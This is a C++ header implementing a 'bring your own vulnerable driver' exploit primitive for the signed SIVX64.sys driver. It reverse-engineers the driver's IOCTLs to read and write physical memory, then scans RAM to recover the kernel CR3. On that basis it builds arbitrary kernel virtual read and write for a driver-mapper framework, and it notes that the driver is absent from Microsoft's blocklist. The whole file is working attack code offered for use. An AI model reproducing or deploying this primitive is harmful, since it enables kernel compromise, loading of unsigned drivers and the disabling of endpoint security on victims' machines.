#pragma once
// primitive_siv.hpp
// SIVX64.sys BYOVD primitive (SIV - System Information Viewer, RH Software)
// Device: \\.\SIVDRIVER
// Physical memory R/W via dynamically resolved MmMapIoSpace — no IAT trace.
// WHQL signed by Microsoft WHCP. No CVE assigned. Not on HVCI blocklist.
// SHA256 (v5.85): 33903E8FA9F0A2ACAA4784D645E309B0BD780693824B6C2C5FEF257238C77478
//
// IRP_MJ_CREATE (v5.88 IDA): non-empty FileName requires SeSinglePrivilegeCheck LUID 10
// (SeLoadDriverPrivilege). User-mode fix: ntdll RtlAdjustPrivilege(10, TRUE, …) — not only
// AdjustTokenPrivileges. Prefer \\.\Global\SIVDRIVER (Win10 1770+). VM job 88002f68eeb9 OK.
// sc start may return 183 if SIVDriver is already loaded from SIV64X install.

#include "mapper.hpp"
#include <Windows.h>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <string>
#include <memory>
#include <algorithm>
#include <cstdio>
#include <iostream>
#include <vector>

#ifdef min
#undef min
#endif

// v5.88 IDA sub_21984 (raw IoControlCode, not CTL_CODE):
//   0x10 PHY_MEMORY — METHOD_BUFFERED phys READ (inLen != 0x30: first qword = PA)
//   0x13 BIG_MEMORY — METHOD_NEITHER bulk phys READ into UserBuffer
//   0x14 BAR_MEMORY — map PA via MmMapIoSpace, scatter RMW (lab job bf1258815630:
//                     inLen==outLen && inLen>=0x48). This is the WRITE primitive.
// Treating 0x14 output[0] as a usermode VA is wrong (echoes the PA; AV on deref).
static constexpr DWORD SIV_IOCTL_PHYSMEM = 0x10;
static constexpr DWORD SIV_IOCTL_BAR = 0x14;
static constexpr DWORD SIV_BAR_INLEN = 0x48;
static constexpr uint16_t SIV_BAR_FLAG_WRITE = 0x2;
static constexpr uint16_t SIV_BAR_FLAG_READBACK = 0x4;

#pragma pack(push, 1)
struct SivBarReq {
    uint64_t PhysAddr;   // +0x00
    uint32_t Size;       // +0x08  must be 0x100..0x400000
    uint16_t Pad;        // +0x0C
    uint16_t Flags;      // +0x0E  bit1=write, bit2=readback; bit15=bulk copy-out
    uint32_t Reserved;   // +0x10
    uint16_t Count;      // +0x14  scatter entries
    uint16_t Pad2;       // +0x16
    uint8_t  Pad3[0x18]; // +0x18 .. +0x2F  (header is 0x30)
};
struct SivBarEntry {
    uint32_t Offset;     // +0x00 into mapped region
    uint32_t AndMask;    // +0x04 bits kept from old dword
    uint32_t OrValue;    // +0x08 bits set; must be disjoint from AndMask
    uint32_t Old;        // +0x0C filled by driver
    uint32_t Result;     // +0x10 filled by driver
    uint32_t Pad;
};
#pragma pack(pop)
static_assert(sizeof(SivBarReq) == 0x30, "SIV BAR header");
static_assert(sizeof(SivBarEntry) == 0x18, "SIV BAR entry");

static bool SivPhysRead(HANDLE h, uint64_t pa, void* dst, uint32_t sz) {
    if (sz == 0 || sz > 0x40000) return false;
    const DWORD ioLen = std::max<uint32_t>(sz, 16u);
    std::vector<uint8_t> buf(ioLen, 0);
    memcpy(buf.data(), &pa, sizeof(pa));
    DWORD got = 0;
    if (!DeviceIoControl(h, SIV_IOCTL_PHYSMEM, buf.data(), ioLen, buf.data(), ioLen, &got, nullptr))
        return false;
    if (got < sz) return false;
    memcpy(dst, buf.data(), sz);
    return true;
}

static bool SivBarWrite32(HANDLE h, uint64_t pa, uint32_t andMask, uint32_t orValue) {
    if ((andMask & orValue) != 0) return false;
    uint8_t buf[SIV_BAR_INLEN]{};
    auto* req = reinterpret_cast<SivBarReq*>(buf);
    req->PhysAddr = pa & ~0xFFFULL;
    req->Size = 0x1000;
    req->Flags = SIV_BAR_FLAG_WRITE;
    req->Count = 1;
    auto* e = reinterpret_cast<SivBarEntry*>(buf + sizeof(SivBarReq));
    e->Offset = (uint32_t)(pa & 0xFFF);
    e->AndMask = andMask;
    e->OrValue = orValue;
    DWORD got = 0;
    return DeviceIoControl(h, SIV_IOCTL_BAR, buf, SIV_BAR_INLEN, buf, SIV_BAR_INLEN, &got, nullptr) != 0;
}

static bool SivPhysWrite(HANDLE h, uint64_t pa, const void* src, uint32_t sz) {
    if (sz == 0) return false;
    const auto* s = static_cast<const uint8_t*>(src);
    size_t off = 0;
    while (off < sz) {
        const uint64_t aligned = (pa + off) & ~3ull;
        const uint32_t skip = (uint32_t)((pa + off) & 3);
        const size_t n = std::min(sz - off, (size_t)(4 - skip));
        uint32_t keep = 0xFFFFFFFFu;
        uint32_t put = 0;
        for (size_t i = 0; i < n; i++) {
            const uint32_t sh = (skip + (uint32_t)i) * 8;
            keep &= ~(0xFFu << sh);
            put |= (uint32_t)s[off + i] << sh;
        }
        if (!SivBarWrite32(h, aligned, keep, put)) return false;
        off += n;
    }
    return true;
}

static bool SivRead32(HANDLE h, uint64_t pa, uint32_t* out) {
    if (!out) return false;
    return SivPhysRead(h, pa, out, 4);
}

static uint64_t SivRead8(HANDLE h, uint64_t pa) {
    uint64_t v = 0;
    SivPhysRead(h, pa, &v, 8);
    return v;
}

// ── 4-level page table walk (PML4 → PDPT → PD → PT) ─────────
static uint64_t SivVirtToPhys(HANDLE h, uint64_t cr3, uint64_t va) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };

    uint64_t pml4e = SivRead8(h, (cr3 & ~0xFFFULL) + idx(39) * 8);
    if (!(pml4e & 1)) return 0;

    uint64_t pdpte = SivRead8(h, (pml4e & ~0xFFFULL) + idx(30) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFF);

    uint64_t pde = SivRead8(h, (pdpte & ~0xFFFULL) + idx(21) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFF);

    uint64_t pte = SivRead8(h, (pde & ~0xFFFULL) + idx(12) * 8);
    if (!(pte & 1)) return 0;
    return (pte & ~0xFFFULL) | (va & 0xFFF);
}

// ── CR3 bootstrap (DriverLab 26200: low RAM, dual EPROCESS layouts) ──
struct SivEprocOff { uint32_t name, pid, dtb, flink; };

static uint64_t SivBootstrapCR3PhysAnchor(HANDLE h, uint64_t ntVA);

static uint64_t SivBootstrapCR3(HANDLE h) {
    setvbuf(stdout, nullptr, _IONBF, 0);
    printf("[*] SivBootstrapCR3 (low RAM < 512MB)\n");
    using pNtQSI = NTSTATUS (NTAPI*)(ULONG, PVOID, ULONG, PULONG);
    auto NtQSI = (pNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return 0;
    ULONG needed = 0;
    NtQSI(11, nullptr, 0, &needed);
    auto modBuf = std::make_unique<uint8_t[]>(needed);
    if (NtQSI(11, modBuf.get(), needed, &needed) != 0) return 0;
    struct MOD {
        PVOID Section; PVOID MappedBase; PVOID ImageBase;
        ULONG ImageSize; ULONG Flags;
        USHORT LoadOrderIndex; USHORT InitOrderIndex;
        USHORT LoadCount; USHORT OffsetToFileName;
        CHAR FullPathName[256];
    };
    if (!*(ULONG*)modBuf.get()) return 0;
    auto* mod0 = (MOD*)(modBuf.get() + 8);
    const uint64_t ntVA = (uint64_t)mod0->ImageBase;
    printf("[*] ntoskrnl VA=0x%llx\n", (unsigned long long)ntVA);

    const auto validate = [&](uint64_t cr3) -> bool {
        if (!cr3 || cr3 >= 0x100000000ULL || (cr3 & 0xFFF)) return false;
        uint16_t mz = 0;
        const uint64_t pa = SivVirtToPhys(h, cr3, ntVA);
        if (!pa) return false;
        if (!SivPhysRead(h, pa, &mz, 2)) return false;
        return mz == 0x5A4D;
    };

    static const SivEprocOff layouts[] = {
        { 0x338, 0x1D0, 0x028, 0x1D8 }, // Win11 26200 (Corsair matrix)
        { 0x5A8, 0x440, 0x028, 0x448 },
        { 0x450, 0x2E8, 0x028, 0x2F0 },
    };
    // PML4 was not in the first 512MB (scan 2026-11-13, CR3=0, no self-ref).
    const uint64_t kScanHi = 0x100000000ULL;
    const int ntIdx = (int)((ntVA >> 39) & 0x1FF);
    uint64_t cr3 = 0;
    printf("[*] SIV self-ref PML4 scan 0x100000-0x%llx ntIdx=%d\n",
           (unsigned long long)kScanHi, ntIdx);

    auto tryLayout = [&](uint64_t basePa, const SivEprocOff& o) -> bool {
        uint8_t name[8]{};
        if (!SivPhysRead(h, basePa + o.name, name, 6)) return false;
        if (memcmp(name, "System", 6) != 0) return false;
        uint32_t pid32 = 0;
        if (!SivPhysRead(h, basePa + o.pid, &pid32, 4) || pid32 != 4) {
            uint64_t pid64 = SivRead8(h, basePa + o.pid);
            if (pid64 != 4) return false;
        }
        uint64_t dtb = SivRead8(h, basePa + o.dtb) & ~0xFFFULL;
        if (dtb < 0x1000 || dtb >= 0x200000000ULL) return false;
        const uint64_t flink = SivRead8(h, basePa + o.flink);
        if ((flink >> 48) != 0xFFFF) return false;
        printf("[*] candidate pa=0x%llx dtb=0x%llx name@0x%x pid@0x%x\n",
               (unsigned long long)basePa, (unsigned long long)dtb, o.name, o.pid);
        if (validate(dtb)) {
            cr3 = dtb;
            return true;
        }
        return false;
    };

    for (uint64_t pa = 0x100000; pa < kScanHi && !cr3; pa += 0x1000) {
        if ((pa & 0xFFFFF) == 0)
            printf("[*]   SIV scan: 0x%llx\n", (unsigned long long)pa);
        fflush(stdout);
        uint8_t page[0x1000];
        if (!SivPhysRead(h, pa, page, 0x1000)) continue;
        if (ntIdx >= 0 && ntIdx < 512) {
            const uint64_t ntkE = *reinterpret_cast<uint64_t*>(page + ntIdx * 8);
            if (ntkE & 1) {
                for (int idx = 256; idx < 512 && !cr3; ++idx) {
                    const uint64_t e = *reinterpret_cast<uint64_t*>(page + idx * 8);
                    if (!(e & 1)) continue;
                    if ((e & 0x000FFFFFFFFFF000ULL) != pa) continue;
                    printf("[*] self-ref pa=0x%llx idx=%d\n", (unsigned long long)pa, idx);
                    if (validate(pa)) {
                        cr3 = pa;
                        break;
                    }
                }
            }
        }
        if (cr3) break;
        for (const auto& o : layouts) {
            if (o.name + 8 <= 0x1000 && tryLayout(pa, o))
                break;
        }
        if (cr3) break;
        for (uint32_t off = 0; off < 0xA00 && !cr3; ++off) {
            if (memcmp(page + off, "System", 6) != 0) continue;
            for (const auto& o : layouts) {
                if (off < o.name) continue;
                const uint64_t eproc = pa + off - o.name;
                if (tryLayout(eproc, o)) break;
            }
        }
    }
    if (!cr3) {
        // Last resort: fixed offsets without page load (fast path from MyPort matrix).
        for (uint64_t pa = 0x100000; pa < kScanHi && !cr3; pa += 0x1000) {
            for (const auto& o : layouts) {
                uint32_t head = 0;
                if (!SivRead32(h, pa + o.name, &head)) continue;
                if (head != 0x74737953) continue;
                uint32_t pid = 0;
                if (!SivRead32(h, pa + o.pid, &pid) || pid != 4) continue;
                uint64_t dtb = SivRead8(h, pa + o.dtb) & ~0xFFFULL;
                if (!dtb) continue;
                if (validate(dtb)) { cr3 = dtb; break; }
            }
        }
    }
    if (!cr3)
        cr3 = SivBootstrapCR3PhysAnchor(h, ntVA);
    printf("[+] SIV CR3=0x%llx\n", (unsigned long long)cr3);
    return cr3;
}

// Offline phys-anchor: match first page of ntoskrnl.exe on disk to a RAM page,
// then brute CR3 by requiring the walk(ntVA) lands on that PA (no EPROCESS scan).
static uint64_t SivBootstrapCR3PhysAnchor(HANDLE h, uint64_t ntVA) {
    printf("[*] SivBootstrapCR3PhysAnchor ntVA=0x%llx\n", (unsigned long long)ntVA);
    wchar_t sysDir[MAX_PATH]{};
    if (!GetSystemDirectoryW(sysDir, MAX_PATH))
        return 0;
    std::wstring ntosPath = std::wstring(sysDir) + L"\\ntoskrnl.exe";
    HANDLE hf = CreateFileW(ntosPath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) {
        printf("[!] phys-anchor: open ntoskrnl.exe failed gle=%u\n", GetLastError());
        return 0;
    }
    uint8_t diskPage[0x1000]{};
    DWORD got = 0;
    if (!ReadFile(hf, diskPage, sizeof(diskPage), &got, nullptr) || got < 0x200) {
        CloseHandle(hf);
        return 0;
    }
    CloseHandle(hf);
    if (diskPage[0] != 'M' || diskPage[1] != 'Z')
        return 0;

    const int ntIdx = (int)((ntVA >> 39) & 0x1FF);
    const uint64_t kScanHi = 0x100000000ULL;
    uint64_t paNtos = 0;

    for (uint64_t pa = 0x100000; pa < kScanHi && !paNtos; pa += 0x1000) {
        if ((pa & 0xFFFFF) == 0)
            printf("[*]   phys-anchor ntos PA scan: 0x%llx\n", (unsigned long long)pa);
        uint8_t ramPage[0x200]{};
        if (!SivPhysRead(h, pa, ramPage, sizeof(ramPage)))
            continue;
        if (memcmp(ramPage, diskPage, sizeof(ramPage)) != 0)
            continue;
        paNtos = pa;
        printf("[+] phys-anchor ntos disk page @ PA 0x%llx\n", (unsigned long long)paNtos);
    }
    if (!paNtos)
        return 0;

    auto walkPml4Page = [&](const uint8_t* pml4, uint64_t va) -> uint64_t {
        auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };
        uint64_t pml4e = *reinterpret_cast<const uint64_t*>(pml4 + idx(39) * 8);
        if (!(pml4e & 1)) return 0;
        uint64_t pdpte = SivRead8(h, (pml4e & ~0xFFFULL) + idx(30) * 8);
        if (!(pdpte & 1)) return 0;
        if (pdpte & (1ULL << 7))
            return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFF);
        uint64_t pde = SivRead8(h, (pdpte & ~0xFFFULL) + idx(21) * 8);
        if (!(pde & 1)) return 0;
        if (pde & (1ULL << 7))
            return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFF);
        uint64_t pte = SivRead8(h, (pde & ~0xFFFULL) + idx(12) * 8);
        if (!(pte & 1)) return 0;
        return (pte & ~0xFFFULL) | (va & 0xFFF);
    };

    for (uint64_t cr3pa = 0x100000; cr3pa < kScanHi; cr3pa += 0x1000) {
        if ((cr3pa & 0xFFFFFF) == 0)
            printf("[*]   phys-anchor CR3 try: 0x%llx\n", (unsigned long long)cr3pa);
        uint8_t pml4[0x1000]{};
        if (!SivPhysRead(h, cr3pa, pml4, sizeof(pml4)))
            continue;
        bool selfRef = false;
        for (int idx = 256; idx < 512; ++idx) {
            uint64_t e = *reinterpret_cast<uint64_t*>(pml4 + idx * 8);
            if (!(e & 1)) continue;
            if ((e & 0x000FFFFFFFFFF000ULL) == cr3pa) {
                selfRef = true;
                break;
            }
        }
        if (!selfRef) {
            uint64_t e = *reinterpret_cast<uint64_t*>(pml4 + ntIdx * 8);
            if (!(e & 1))
                continue;
        }
        const uint64_t walked = walkPml4Page(pml4, ntVA);
        if (walked != paNtos)
            continue;
        uint16_t mz = 0;
        if (!SivPhysRead(h, paNtos, &mz, 2) || mz != 0x5A4D)
            continue;
        printf("[+] phys-anchor CR3=0x%llx (walk ntVA -> PA 0x%llx)\n",
               (unsigned long long)cr3pa, (unsigned long long)paNtos);
        return cr3pa;
    }
    return 0;
}

// ── Virtual kernel R/W (page-at-a-time, much faster than TS) ──
static bool SivVirtRead(HANDLE h, uint64_t cr3, uint64_t va, void* dst, size_t n) {
    auto* d = (uint8_t*)dst;
    while (n) {
        uint64_t pa = SivVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);
        if (!SivPhysRead(h, pa, d, (uint32_t)chunk)) return false;
        va += chunk; d += chunk; n -= chunk;
    }
    return true;
}

static bool SivVirtWrite(HANDLE h, uint64_t cr3, uint64_t va, const void* src, size_t n) {
    const auto* s = (const uint8_t*)src;
    while (n) {
        uint64_t pa = SivVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);
        if (!SivPhysWrite(h, pa, s, (uint32_t)chunk)) return false;
        va += chunk; s += chunk; n -= chunk;
    }
    return true;
}

// ── Session state ────────────────────────────────────────────
struct SivSession {
    HANDLE dev = INVALID_HANDLE_VALUE;
    uint64_t cr3 = 0;
};

using RtlAdjustPrivilegeFn = LONG(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

inline bool SivEnableTokenPrivilege(const wchar_t* name)
{
    HANDLE tok = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return false;
    LUID luid{};
    if (!LookupPrivilegeValueW(nullptr, name, &luid)) {
        CloseHandle(tok);
        return false;
    }
    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), nullptr, nullptr)) {
        CloseHandle(tok);
        return false;
    }
    const DWORD gle = GetLastError();
    CloseHandle(tok);
    return gle == ERROR_SUCCESS;
}

inline bool SivEnsureLoadDriverPriv(std::string& err)
{
    bool rtlOk = false;
    auto fn = reinterpret_cast<RtlAdjustPrivilegeFn>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlAdjustPrivilege"));
    if (fn) {
        BOOLEAN was = FALSE;
        const LONG st = fn(10, TRUE, FALSE, &was);
        rtlOk = (st == 0);
        if (!rtlOk)
            err = "RtlAdjustPrivilege(SeLoadDriver) st=" + std::to_string((long)st);
    } else {
        err = "RtlAdjustPrivilege missing";
    }

    const bool tokOk = SivEnableTokenPrivilege(L"SeLoadDriverPrivilege");
    if (!tokOk && err.empty())
        err = "AdjustTokenPrivileges(SeLoadDriver) failed gle=" + std::to_string(GetLastError());
    else if (!tokOk)
        err += "; AdjustTokenPrivileges(SeLoadDriver) failed";

    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    PSID adminSid = nullptr;
    if (AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                                 0, 0, 0, 0, 0, 0, &adminSid)) {
        CheckTokenMembership(nullptr, adminSid, &isAdmin);
        FreeSid(adminSid);
    }
    if (!isAdmin) {
        err += "; process not in Administrators group (elevated lab session required)";
        return false;
    }

    return rtlOk || tokOk;
}

inline HANDLE SivCreateDeviceHandle(DWORD* gleOut = nullptr)
{
    const wchar_t* paths[] = { L"\\\\.\\Global\\SIVDRIVER", L"\\\\.\\SIVDRIVER" };
    for (const wchar_t* p : paths) {
        HANDLE h = CreateFileW(p, GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_READ | FILE_SHARE_WRITE,
                               nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h != INVALID_HANDLE_VALUE)
            return h;
        if (gleOut)
            *gleOut = GetLastError();
    }
    return INVALID_HANDLE_VALUE;
}

// ── Open SIVDRIVER device → KernelPrimitives ─────────────────
inline KernelPrimitives OpenSivDriver(std::string& err)
{
    if (!SivEnsureLoadDriverPriv(err))
        return {};

    DWORD gle = 0;
    HANDLE h = SivCreateDeviceHandle(&gle);
    if (h == INVALID_HANDLE_VALUE) {
        err = "OpenSivDriver: CreateFile failed err=" + std::to_string(gle) +
              " (SIV service loaded? SeLoadDriverPrivilege?)";
        return {};
    }

    uint32_t smoke = 0;
    if (!SivPhysRead(h, 0x1000, &smoke, 4)) {
        CloseHandle(h);
        err = "OpenSivDriver: smoke test read failed (IOCTL rejected)";
        return {};
    }
    printf("[+] SIV smoke PA 0x1000 = 0x%x\n", smoke);
    if (!SivBarWrite32(h, 0x1000, 0xFFFFFFFFu, 0)) {
        CloseHandle(h);
        err = "OpenSivDriver: BAR write IOCTL 0x14 failed (need flag 0x2 RMW)";
        return {};
    }
    printf("[+] SIV BAR write smoke (keep-all RMW at PA 0x1000) ok\n");

    uint64_t cr3 = 0;
    if (const char* env = std::getenv("SIV_CR3")) {
        cr3 = std::strtoull(env, nullptr, 0);
        printf("[*] SIV_CR3 override env=0x%llx\n", (unsigned long long)cr3);
    }
    if (!cr3)
        cr3 = SivBootstrapCR3(h);
    if (!cr3) {
        CloseHandle(h);
        err = "OpenSivDriver: CR3 bootstrap failed (EPROCESS + phys-anchor)";
        return {};
    }

    std::cout << "[+] SIVX64 opened, CR3=0x" << std::hex << cr3 << std::dec << "\n";

    auto sp = std::make_shared<SivSession>();
    sp->dev = h;
    sp->cr3 = cr3;

    KernelPrimitives p;

    p.ReadKernelMemory = [sp](void* dst, uint64_t src, size_t sz) -> bool {
        return SivVirtRead(sp->dev, sp->cr3, src, dst, sz);
    };

    p.WriteKernelMemory = [sp](uint64_t dst, const void* src, size_t sz) -> bool {
        return SivVirtWrite(sp->dev, sp->cr3, dst, src, sz);
    };

    p.AllocateKernelMemory = nullptr;
    p.ReadPhysicalMemory = [sp](void* dst, uint64_t pa, size_t sz) -> bool {
        return SivPhysRead(sp->dev, pa, dst, (uint32_t)sz);
    };
    p.cr3 = cr3;
    p.UpdateCR3 = [sp](uint64_t c) { sp->cr3 = c; };

    return p;
}
